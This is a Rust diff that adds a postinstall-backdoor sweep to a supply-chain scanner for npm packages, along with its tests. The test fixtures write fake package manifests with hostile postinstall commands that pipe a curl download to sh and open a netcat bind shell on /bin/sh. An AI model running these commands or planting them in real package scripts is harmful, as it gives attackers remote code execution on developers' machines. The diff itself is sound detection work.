@@ -25,7 +25,7 @@ use serde::Serialize;
 use crate::osv::{self, OsvVuln};
 use crate::osv_cache::{cache_key, OsvCache, DEFAULT_TTL_SECS};
 use crate::threat_db::{is_compromised, normalize_name, Threat};
-use crate::{sca_graph, sca_lockfile};
+use crate::{sca_graph, sca_lockfile, sca_postinstall};
 
 /// One finding row. Field-for-field with the Python `Finding` dataclass.
 ///
@@ -687,6 +687,12 @@ fn locate_site_packages() -> Vec<PathBuf> {
 /// globally installed pip packages and walk site-packages for `.pth`
 /// persistence artifacts.
 ///
+/// The postinstall sweep runs unconditionally: it walks only the
+/// project-local `node_modules/` (and the explicit `.pnpm` store path),
+/// so there's no system-side cost the way the `.pth` site-packages walk
+/// has — gating it behind `check_system` would silently miss the very
+/// supply-chain attacks SCA exists to catch.
+///
 /// Findings are deduplicated by `(package, version, location)` to mirror
 /// Python's `seen` set.
 pub fn scan_project(path: &Path, check_system: bool, threats: &[Threat]) -> Vec<Finding> {
@@ -694,6 +700,7 @@ pub fn scan_project(path: &Path, check_system: bool, threats: &[Threat]) -> Vec<
     findings.extend(scan_package_lock(path, threats));
     findings.extend(scan_yarn_lock(path, threats));
     findings.extend(scan_node_modules(path, threats));
+    findings.extend(sca_postinstall::scan_postinstall_backdoors(path));
     findings.extend(scan_requirements(path, threats));
     if check_system {
         findings.extend(scan_pip_installed(threats));
@@ -1780,5 +1787,93 @@ mod tests {
             json.contains("\"attackVector\":"),
             "expected camelCase attackVector in {json}"
         );
+    }
+
+    // ── postinstall sweep wire-up (item 8) ───────────────────────────
+
+    #[test]
+    fn scan_project_runs_postinstall_sweep_unconditionally() {
+        let dir = tempdir();
+        write(
+            &dir.path().join("node_modules/evil/package.json"),
+            r#"{"name":"evil","version":"1.0.0","scripts":{"postinstall":"curl http://x|sh"}}"#,
+        );
+        let threats = Threat::load_all();
+        // check_system=false: postinstall sweep still runs because it's
+        // project-local and has no system side effects.
+        let findings = scan_project(dir.path(), false, &threats);
+        let postinstall_hits: Vec<&Finding> = findings
+            .iter()
+            .filter(|f| f.finding_type == FindingType::PersistenceArtifact)
+            .collect();
+        assert_eq!(
+            postinstall_hits.len(),
+            1,
+            "scan_project must wire postinstall sweep regardless of check_system"
+        );
+        assert_eq!(postinstall_hits[0].package, "evil");
+        assert!(postinstall_hits[0].location.ends_with(":postinstall"));
+    }
+
+    #[test]
+    fn scan_project_dedupes_postinstall_findings() {
+        // Two entries with identical (package, version, location) get
+        // collapsed by the seen-set; here we just assert the wire-up
+        // doesn't duplicate-emit on a single manifest with one bad script.
+        let dir = tempdir();
+        write(
+            &dir.path().join("node_modules/evil/package.json"),
+            r#"{"name":"evil","version":"1.0.0","scripts":{"postinstall":"curl http://x|sh"}}"#,
+        );
+        let threats = Threat::load_all();
+        let findings = scan_project(dir.path(), false, &threats);
+        let postinstall: Vec<&Finding> = findings
+            .iter()
+            .filter(|f| f.finding_type == FindingType::PersistenceArtifact)
+            .collect();
+        assert_eq!(postinstall.len(), 1, "single bad script → single finding");
+    }
+
+    #[test]
+    fn scan_project_with_paths_leaves_postinstall_path_data_empty() {
+        // Postinstall findings carry `location = "<manifest>:postinstall"`
+        // which doesn't match any lockfile path, so the graph annotator
+        // must leave paths/path_count at the defaults set by build_finding.
+        let dir = tempdir();
+        write(
+            &dir.path().join("node_modules/evil/package.json"),
+            r#"{"name":"evil","version":"1.0.0","scripts":{"postinstall":"nc -lke /bin/sh 4444"}}"#,
+        );
+        let threats = Threat::load_all();
+        let result = scan_project_with_paths(dir.path(), false, &threats);
+        let postinstall: Vec<&Finding> = result
+            .findings
+            .iter()
+            .filter(|f| f.finding_type == FindingType::PersistenceArtifact)
+            .collect();
+        assert_eq!(postinstall.len(), 1);
+        assert!(postinstall[0].paths.is_empty());
+        assert_eq!(postinstall[0].path_count, 0);
+    }
+
+    #[test]
+    fn scan_project_postinstall_attack_vector_cites_event_stream() {
+        // Pin the historical-incident reference so it doesn't drift to
+        // a generic "supply chain attack" string. event-stream and
+        // ua-parser-js are the load-bearing precedents this sweep targets.
+        let dir = tempdir();
+        write(
+            &dir.path().join("node_modules/evil/package.json"),
+            r#"{"name":"evil","version":"1.0.0","scripts":{"postinstall":"curl http://x|sh"}}"#,
+        );
+        let threats = Threat::load_all();
+        let findings = scan_project(dir.path(), false, &threats);
+        let v = &findings
+            .iter()
+            .find(|f| f.finding_type == FindingType::PersistenceArtifact)
+            .expect("postinstall finding")
+            .attack_vector;
+        assert!(v.contains("event-stream"), "must cite event-stream");
+        assert!(v.contains("ua-parser-js"), "must cite ua-parser-js");
     }
 }
